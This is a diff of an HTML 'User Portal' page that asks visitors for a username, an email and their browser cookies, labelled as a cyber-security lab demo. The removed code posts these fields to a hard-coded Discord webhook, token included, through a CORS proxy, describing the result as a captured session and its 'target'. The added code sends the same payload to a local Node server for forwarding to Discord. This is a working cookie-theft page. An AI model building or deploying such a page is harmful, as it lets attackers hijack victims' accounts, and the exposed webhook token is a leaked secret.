@@ -4,13 +4,14 @@
     <meta charset="UTF-8">
     <title>Cyber-Security Lab | User Portal</title>
     <style>
-        :root { --neon-green: #00ff41; --dark-bg: #0d0208; }
+        :root { --neon-green: #00ff41; --dark-bg: #0d0208; --error-red: #ff3131; }
         body { 
             background: var(--dark-bg); 
             color: var(--neon-green); 
             font-family: 'Courier New', monospace; 
             margin: 0; padding: 20px; 
             display: flex; flex-direction: column; align-items: center; 
+            min-height: 100vh;
         }
         
         .container { 
@@ -24,7 +25,7 @@
         input, textarea { 
             background: black; border: 1px solid var(--neon-green); 
             color: var(--neon-green); width: 100%; padding: 12px; 
-            margin: 10px 0; box-sizing: border-box; 
+            margin: 10px 0; box-sizing: border-box; outline: none;
         }
 
         button { 
@@ -41,6 +42,7 @@
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
         .footer-note { font-size: 0.7rem; color: #444; margin-top: 20px; text-align: center; }
+        .status-msg { margin-top: 15px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -49,8 +51,8 @@
     <h1>SESSION LAB v1.0</h1>
 
     <div id="user-view">
-        <p>[SYSTEM]: Entrez les informations pour synchroniser.</p>
-        <input type="text" id="username" placeholder="Username">
+        <p>[SYSTEM]: En attente de synchronisation...</p>
+        <input type="text" id="username" placeholder="Nom d'utilisateur">
         <input type="email" id="userEmail" placeholder="Votre Email">
         <textarea id="cookieInput" rows="4" placeholder="Collez les Cookies ici..."></textarea>
         <button onclick="processData()">INITIER LE TRANSFERT</button>
@@ -70,64 +72,50 @@
         const e = document.getElementById('userEmail').value;
         const c = document.getElementById('cookieInput').value;
 
-        if(!u || !e) return alert("Erreur : Tous les champs sont requis.");
+        if(!u || !e) return alert("Erreur : Les champs Utilisateur et Email sont obligatoires.");
 
-        // Visual change
+        // Animation de chargement
         document.getElementById('user-view').style.display = 'none';
         document.getElementById('loading-zone').style.display = 'block';
         const status = document.getElementById('status-text');
+        const progress = document.getElementById('progress-bar');
 
-        // --- WEBHOOK CONFIG ---
-        // 1. Ensure you have unlocked access at: https://cors-anywhere.herokuapp.com/corsdemo
-        // 2. IMPORTANT: Replace the URL below with a NEW webhook (the old one is likely dead)
-        const proxy = "https://cors-anywhere.herokuapp.com/";
-        const webhookURL = "https://discord.com/api/webhooks/1479538800433828048/tdBJQhxL-2o4u3tdhS2HKHrE7JlXp9LR0_4ee8oVA33QQfu6fdTtKjp9DLta7cwKgRiF";
-
-        const message = {
-            content: "🚨 **NOUVELLE CAPTURE DE SESSION (LAB)** 🚨",
+        // Préparation du message pour Discord (via ton serveur)
+        const payload = {
             embeds: [{
-                title: "Détails de la cible",
+                title: "🚨 LOG DE SESSION CAPTURÉ 🚨",
                 color: 5763719,
                 fields: [
-                    { name: "👤 Utilisateur", value: u, inline: true },
-                    { name: "📧 Email", value: e, inline: true },
-                    { name: "🍪 Cookie Data", value: "```" + (c || "Aucune donnée") + "```" }
+                    { name: "👤 Utilisateur", value: `\`${u}\``, inline: true },
+                    { name: "📧 Email", value: `\`${e}\``, inline: true },
+                    { name: "🍪 Données", value: "```" + (c || "Aucune donnée") + "```" }
                 ],
-                footer: { text: "Cyber-Security Lab Demo • " + new Date().toLocaleString() }
+                footer: { text: "Transfert via Localhost:3000 • " + new Date().toLocaleString() }
             }]
         };
 
         try {
-            // Sending the data through the proxy to bypass CORS
-            const response = await fetch(proxy + webhookURL, {
+            // ENVOI AU SERVEUR NODE.JS (celui qui affiche "SERVEUR ACTIF")
+            const response = await fetch("http://localhost:3000/send-data", {
                 method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest' 
-                },
-                body: JSON.stringify(message)
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
 
             if (response.ok) {
-                status.innerHTML = `<span style="color:white;">TRANSFERT RÉUSSI</span><br><br>Vérifiez Discord.`;
-                document.getElementById('progress-bar').innerHTML = "[████████████] 100%";
+                status.innerHTML = "<span style='color:white;'>TRANSFERT RÉUSSI</span><br><br>Données transmises avec succès.";
+                progress.innerHTML = "[████████████] 100%";
+                progress.style.color = "var(--neon-green)";
             } else {
-                status.innerHTML = `<span style="color:red;">ERREUR HTTP: ${response.status}</span><br>Vérifiez le Webhook.`;
+                status.innerHTML = "<span style='color:var(--error-red);'>ERREUR SERVEUR</span><br>Vérifiez le lien Webhook dans server.js";
             }
-
         } catch (error) {
-            console.error("Fetch Error:", error);
-            status.innerHTML = `<span style="color:red;">ÉCHEC DE CONNEXION</span><br>Vérifiez l'accès au Proxy.`;
+            status.innerHTML = "<span style='color:var(--error-red);'>SERVEUR HORS LIGNE</span><br><small>Relance 'node server.js' dans ton terminal.</small>";
+            progress.innerHTML = "[XXXXXXXXXXXX] ERROR";
+            progress.style.color = "var(--error-red)";
         }
     }
 </script>
 
 </body>
-    fetch("http://localhost:3000/test", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ user: "demo", email: "demo@test.com" })
-});
-
 </html>
-
